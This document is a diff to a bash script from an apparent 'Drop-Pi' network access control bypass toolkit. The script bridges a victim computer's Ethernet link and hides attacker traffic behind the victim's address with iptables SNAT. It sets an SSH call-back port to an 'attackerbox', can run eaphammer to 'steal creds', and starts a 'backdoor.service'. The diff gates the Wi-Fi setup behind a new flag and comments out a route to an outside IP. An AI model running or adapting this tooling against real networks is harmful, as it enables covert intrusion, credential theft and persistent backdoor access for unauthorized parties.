@@ -12,15 +12,16 @@ fi
 #GWMAC="00:de:ad:be:ef:00"
 #GWMAC="Testing"
 BRINT=br0 #bridge interface
-SWINT=eth1 #interface of usb2eth plugged into switch
+SWINT=eth1
 SWMAC=$(ifconfig $SWINT | grep -i ether | awk '{ print $2 }') #get SWINT MAC address automatically.
-COMPINT=eth0 #interface of usb2eth plugged into victim machine
+COMPINT=eth0
 BRIP=169.254.66.66 #IP for the bridge
 WINT=wlan0 #Wireless interface running hostapd
 WNET="192.168.19.0/24" #Wireless network block
 DPORT=2222 #SSH CALL BACK PORT USE victimip:2222 to connect to attackerbox:22
 RANGE=61000-62000 #Ports for my traffic on NAT
 RUNAPD=0 #1 - yes steal creds, 0 - no, just don't
+RUNWF=0 #1 - yes to set up wireless, 0 - no, just don't
 HOSTAPDPATH="/opt/Drop-Pi/eaphammer/hostapd-eaphammer/hostapd/hostapd-eaphammer"
 HOSTWIREDCONF="/opt//Drop-Pi/NacBypass2.0/hostapd-wired.conf"
 RANDSTRING=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
@@ -88,8 +89,8 @@ EAPOLMagic() {
       fi
       return 0
     else
-      echo "Failed to get initial victim traffic, is the machine on? Are you one? Who am I?"
-      echo "Failed to get initial victim traffic, is the machine on? Are you one? Who am I?/n" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      echo "Failed to get initial victim traffic, is the machine on? Are you on? Who am I?"
+      echo "Failed to get initial victim traffic, is the machine on? Are you on? Who am I?/n" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       ErrNotifi
     fi
 }
@@ -255,36 +256,40 @@ GoGoNacBypass() {
       iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
       iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP
 
-      #Check if wireless ap is running, if it is route all traffic over bridge with snat
-      #if CheckWireless; then
-      #     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p tcp -j SNAT --to $COMIP:$RANGE
-      #     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p udp -j SNAT --to $COMIP:$RANGE
-      #     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p icmp -j SNAT --to $COMIP
-      #     echo 1 > /proc/sys/net/ipv4/ip_forward
-      #fi
-      #echo "Creating route for WIFI dualhomed access to internet."
-      #echo "Creating route for WIFI dualhomed access to internet." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
-      echo "Creating route for all internal network traffice."
-      echo "Creating route for all internal network traffice." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
-      
+      if [ $RUNWF -eq 1 ]; then
+      	#Check if wireless ap is running, if it is route all traffic over bridge with snat
+      	#if CheckWireless; then
+      	#     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p tcp -j SNAT --to $COMIP:$RANGE
+      	#     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p udp -j SNAT --to $COMIP:$RANGE
+      	#     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p icmp -j SNAT --to $COMIP
+      	#     echo 1 > /proc/sys/net/ipv4/ip_forward
+      	#fi
+      	#echo "Creating route for WIFI dualhomed access to internet."
+      	#echo "Creating route for WIFI dualhomed access to internet." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      fi
+      echo "Creating route for all internal network traffic."
+      echo "Creating route for all internal network traffic." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+
 
       echo "Time for fun & profit"
       echo "Time for fun & profit" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       echo "Starting backdoor service"
       echo "Starting backdoor service" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
-      echo "Bringing up WLAN0"
-      echo "Bringing up WLAN0" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log 
-      systemctl enable NetworkManager
-      sleep 10
-      systemctl start NetworkManager
-      sleep 10
-      WLANGWIP=`route | grep wlan0 | grep default | cut -d "0" -f 1 | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
-      
-      echo "Grabbing the WIFI Default GW IP: $WLANGWIP "
-      echo "Grabbing the WIFI Default GW IP: $WLANGWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
-      sleep 20
-      ip route add 66.42.94.137/32 via $WLANGWIP dev wlan0
 
+      if [ $RUNWF -eq 1 ]; then
+	      echo "Bringing up WLAN0"
+      	echo "Bringing up WLAN0" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      	systemctl enable NetworkManager
+      	sleep 10
+      	systemctl start NetworkManager
+      	sleep 10
+      	WLANGWIP=`route | grep wlan0 | grep default | cut -d "0" -f 1 | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
+
+      	echo "Grabbing the WIFI Default GW IP: $WLANGWIP "
+      	echo "Grabbing the WIFI Default GW IP: $WLANGWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      	sleep 20
+      	#ip route add 66.42.94.137/32 via $WLANGWIP dev wlan0
+      fi
       systemctl start backdoor.service
       ProfitNotifi
    fi
@@ -360,9 +365,11 @@ case "$1" in
        brctl delif $BRINT $SWINT
        brctl delbr $BRINT
     fi
-    echo "Bringing down WLAN0"
-    ifconfig wlan0 down
-    systemctl disable NetworkManager
-    systemctl stop NetworkManager
+    if [ $RUNWF -eq 1 ]; then
+    	echo "Bringing down WLAN0"
+    	ifconfig wlan0 down
+    	systemctl disable NetworkManager
+    	systemctl stop NetworkManager
+    fi
   ;;
 esac
